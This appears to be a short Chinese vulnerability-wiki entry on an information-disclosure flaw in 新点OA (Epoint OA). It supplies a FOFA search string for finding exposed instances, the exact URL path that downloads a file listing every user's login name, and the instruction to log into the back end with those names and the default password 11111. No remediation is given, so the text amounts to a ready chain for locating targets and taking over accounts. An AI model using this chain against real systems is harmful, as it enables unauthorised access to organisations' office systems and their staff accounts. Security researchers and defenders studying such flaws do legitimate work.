# 新点OA 敏感信息泄露漏洞

## 漏洞描述

新点OA 存在敏感信息泄露漏洞，访问特定的Url时可以获取所有用户的登录名信息，攻击者获取后可以进一步利用

## 漏洞影响

> [!NOTE]
>
> 新点OA

## FOFA

> [!NOTE]
>
> app="新点OA"

## 漏洞复现

构造的Url为

```
/ExcelExport/人员列表.xls
```

将会下载人员列表文件

![](http://wikioss.peiqi.tech/vuln/xd-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

通过获取的登录名登陆后台(默认密码11111)